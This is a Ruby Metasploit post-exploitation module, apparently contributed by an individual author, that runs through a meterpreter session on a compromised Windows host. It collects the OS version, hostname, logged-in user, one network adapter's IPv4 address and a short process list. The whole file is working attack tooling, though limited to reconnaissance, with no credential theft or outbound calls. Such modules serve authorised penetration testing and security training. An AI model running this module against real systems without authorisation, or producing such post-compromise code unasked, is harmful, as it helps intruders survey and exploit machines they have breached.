#!/usr/bin/env ruby
##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::System

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Windows Info Collector',
      'Description'  => %q{
        Collects system details from a compromised Windows host. 
        This includes OS info, user identity, basic network setup, and active processes.
      },
      'Author'       => ['Joshua Santiago'],
      'License'      => MSF_LICENSE,
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))
  end

  def run
    unless session.type == 'meterpreter'
      fail_with(Failure::NoTarget, 'A meterpreter session is required.')
    end

    target_ip = session.session_host
    print_status("📡 Starting data collection on #{target_ip}")

    collect_os_info
    collect_user_identity
    collect_network_summary
    collect_process_snapshot
  end

  def collect_os_info
    begin
      info = session.sys.config.sysinfo
      print_status("🖥️  OS Version: #{info['OS']}")
      print_status("🖥️  Hostname: #{info['Computer']}")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to get OS info: #{e.message}")
    end
  end

  def collect_user_identity
    begin
      user = session.sys.config.getuid
      print_status("👤 Logged-in User: #{user}")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to get user info: #{e.message}")
    end
  end

  def collect_network_summary
    begin
      adapter = nil
      config_output = cmd_exec('ipconfig')

      config_output.each_line do |line|
        if line =~ /Ethernet adapter (.+):/
          adapter = $1.strip
        elsif line =~ /IPv4 Address.*: ([\d\.]+)/ && adapter
          print_status("🌐 Interface: #{adapter}, IP Address: #{$1.strip}")
          break
        end
      end
    rescue => e
      print_error("Failed to get network info: #{e.message}")
    end
  end

  def collect_process_snapshot
    begin
      processes = session.sys.process.get_processes
      print_status("🔍 Showing first two running processes:")
      processes.first(2).each do |proc|
        print_status("🔹 PID #{proc['pid']} - #{proc['name']}")
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to list processes: #{e.message}")
    end
  end
end